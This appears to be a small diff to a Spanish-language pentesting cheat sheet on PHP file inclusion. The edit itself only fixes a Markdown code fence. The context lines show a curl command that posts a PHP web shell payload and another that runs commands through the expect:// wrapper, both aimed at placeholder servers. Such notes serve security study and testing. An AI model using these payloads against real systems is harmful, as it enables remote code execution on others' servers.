@@ -35,7 +35,7 @@ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<POR
 Si esta extension=expect
 ````
 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
-```
+````
 
 ## Remote File Inclusion (RFI)
 ```
